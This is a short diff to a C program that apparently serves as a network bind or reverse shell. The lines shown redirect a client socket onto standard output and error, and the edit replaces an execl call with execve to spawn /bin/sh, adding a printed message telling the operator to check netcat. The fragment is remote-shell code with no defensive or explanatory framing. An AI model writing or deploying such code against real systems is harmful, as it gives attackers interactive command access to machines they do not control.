@@ -46,7 +46,8 @@ int main()
 	dup2(client_sockid, 1);
 	dup2(client_sockid, 2);
 
-	execl("/bin/sh","sh", NULL); 
+    printf("[+] Spawning a shell, check netcat.\n");
+	execve("/bin/sh",NULL, NULL); 
 	status  = close(host_sockid);
 	if(status == -1) DieWithError("[-] close() failed.\n");
 	
